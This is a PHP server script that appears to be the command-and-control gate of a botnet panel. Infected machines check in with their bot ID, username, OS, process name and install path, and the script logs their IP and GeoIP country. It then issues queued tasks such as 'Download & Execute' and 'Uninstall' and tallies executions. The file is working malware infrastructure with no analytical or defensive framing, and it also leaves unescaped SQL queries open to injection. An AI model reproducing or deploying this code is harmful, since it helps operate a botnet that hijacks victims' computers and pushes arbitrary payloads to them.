<?php
include 'db.php';
include 'include/geo/geoip.inc';
$gi = geoip_open("include/geo/GeoIP.dat", "");

if($_POST && isset($_POST['botid']) && isset($_POST['username']) && isset($_POST['version']) && isset($_POST['os']) && isset($_POST['lastactivity']) && isset($_POST['procname']) && isset($_POST['version']) && isset($_POST['installdate']) && isset($_POST['computername']) && isset($_POST['installpath'])){

	$ip       		= $_SERVER['REMOTE_ADDR'];
	$country  		= geoip_country_id_by_addr($gi, $ip);
	$id       		= $mysqli->escape_string($_POST['botid']);
	$username 		= $mysqli->escape_string($_POST['username']);
	$ver      		= $mysqli->escape_string($_POST['version']);
	$os       		= $mysqli->escape_string($_POST['os']);
	$lastact  		= $mysqli->escape_string($_POST['lastactivity']);
	$prname   		= $mysqli->escape_string($_POST['procname']);
	$version  		= $mysqli->escape_string($_POST['version']);
	$installdate  	= $mysqli->escape_string($_POST['installdate']);
	$pcname		  	= $mysqli->escape_string($_POST['computername']);
	$installpath  	= $mysqli->escape_string($_POST['installpath']);

	$sql = "INSERT INTO bots (bot_id, 
	bot_version, 
	username,
	os_version,
	process_name,
	ipv4,
	country,
	last_activity,
	installdate,
	computername,
	installationpath
	) 
	VALUES ('$id',
	'$version',
	'$username',
	'$os',
	'$prname',
	'$ip',
	'$country',
	'$lastact',
	'$installdate',
	'$pcname',
	'$installpath'
	)";

	//Check For Exists Bot
	$query = $mysqli->query("SELECT bot_id FROM bots WHERE bot_id='$id'");
	if (!$query)
	{
	die("error");
	}

	if(mysqli_num_rows($query) > 0){
		
		$commandquery = $mysqli->query("SELECT cmd FROM bots WHERE bot_id='$id'");
		while($row = $commandquery->fetch_assoc())
		{
			$commandtosend = $row['cmd'];

			if ($commandtosend==="Uninstall"){
				echo "Uninstall";
				exit();
			}
		}

		//Update Last Activity
		$query = $mysqli->query("UPDATE bots SET last_activity='$lastact' WHERE bot_id='$id'");
		if($query){

			$query = $mysqli->query("SELECT * FROM task");
			if(mysqli_num_rows($query) > 0){
		
				while($row = $query->fetch_assoc())
				{
					if($row['Status'] === "Running"){
						$query2 = $mysqli->query("SELECT cmd FROM bots");
						if(mysqli_num_rows($query2) > 0){
							while($row2 = $query2->fetch_assoc())
							{
								if($row['Status'] === "Running"){
									$task = $row['Task'] . "|||" . $row['Parameters'];
									echo $task;
								}
							}
						}else{
							echo "notasks";
						}
					
				}
			}
		
			}else{
				echo "notasks";
			}


		}


		
	}else{

		if($mysqli->query($sql)){
			echo "200";
		}else{
			//Failure
			die("error");
		}
	}
}

if($_POST && isset($_POST['stask'])){
	//Check For Executions

}

if($_POST && isset($_POST['dtask']) && isset($_POST['botid'])){


	
	$action = $_POST['dtask'];
	if($action === "Download" ){
		$action = "Download & Execute";
	}
	$id = $_POST['botid'];
	$query = $mysqli->query("UPDATE task SET Executedon= Executedon + 1 WHERE Task='$action'") or die("Error" .$mysqli->error);

	if($action === "Uninstall"){
		$sql = "DELETE FROM bots WHERE bot_id='$id';";
    	if ($mysqli->query($sql) === TRUE) {
			echo "taskdoneup";
		}else{
			$query = $mysqli->query("UPDATE bots SET cmd='$action' WHERE bot_id='$id'") or die("Error" .$mysqli->error);
			echo "taskdoneup";
		}
}else{
	$query = $mysqli->query("UPDATE bots SET cmd='$action' WHERE bot_id='$id'") or die("Error" .$mysqli->error);
	echo "taskdoneup";
}
}